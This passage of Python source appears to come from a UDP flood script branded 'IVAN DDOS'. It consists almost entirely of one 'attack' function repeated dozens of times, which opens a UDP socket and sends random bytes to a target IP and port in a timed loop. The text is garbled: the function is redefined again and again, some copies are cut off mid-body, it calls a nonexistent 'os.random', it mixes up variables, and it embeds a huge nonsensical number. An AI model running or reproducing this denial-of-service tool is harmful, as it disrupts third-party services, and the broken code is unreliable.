        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
